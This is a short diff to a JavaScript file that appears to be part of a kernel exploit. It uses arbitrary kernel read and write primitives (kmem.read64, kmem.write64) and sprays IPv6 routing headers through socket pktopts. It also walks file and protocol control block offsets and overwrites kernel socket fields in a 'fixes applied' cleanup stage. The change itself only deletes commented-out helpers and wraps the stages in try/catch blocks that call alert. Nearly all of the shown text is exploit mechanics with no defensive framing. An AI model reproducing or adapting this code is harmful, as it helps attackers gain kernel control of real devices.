@@ -1194,33 +1194,7 @@ var  INPCB_PKTOPTS = 0x118;
  
     
 
- /* function get_sock_pktopts(sock) {
-  const sock_data = get_fd_data_addr(sock);
-  const pcb = kmem.read64(sock_data + SO_PCB);
-  return kmem.read64(pcb + INPCB_PKTOPTS);
-}
-
-function get_fd_data_addr(sock) {
-  const filep = kmem.read64(ofiles + sock * SIZEOF_OFILES);
- // return kmem.read64(filep);
-      return kmem.read64(filep + 0n);
-
-}
-  /* function get_sock_pktopts(sock) {
-    const sock_data = get_fd_data_addr(sock);
-    const pcb       = kmem.read64(sock_data + BigInt(SO_PCB));
-    return kmem.read64(pcb       + BigInt(INPCB_PKTOPTS));
-  }
-
-
-  function get_fd_data_addr(sock) {
-    
-    const filep = kmem.read64(ofiles + BigInt(sock) * 8n);
-    return kmem.read64(filep + 0n);
-  }
- 
-*/
-    
+ try{
 function get_fd_data_addr(fd) {
   const filep = kmem.read64(ofiles.add(fd * SIZEOF_OFILES));
   return kmem.read64(filep.add(0));  
@@ -1231,6 +1205,10 @@ function get_sock_pktopts(fd) {
   const pcb = kmem.read64(so.add(SO_PCB));
   return kmem.read64(pcb.add(INPCB_PKTOPTS));
 }
+ }
+    catch(e){
+           alert(e.message);
+    }
 
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
@@ -1532,7 +1510,7 @@ function get_sock_pktopts(fd) {
 
 
 
- 
+ try{
 for (let i = 0; i < sds.length; i++) {
   const pkto = get_sock_pktopts(sds[i]);
   kmem.write64(pkto.add(off_ip6po_rthdr), 0);
@@ -1553,7 +1531,10 @@ for (const sd of sock_increase_ref) {
   const sock_addr = get_fd_data_addr(sd);
   kmem.write32(sock_addr.add(0), 0x100);
 }
-
+ }
+    catch(e){
+        alert(e.message);
+    }
     log("fixes applied");
     
  
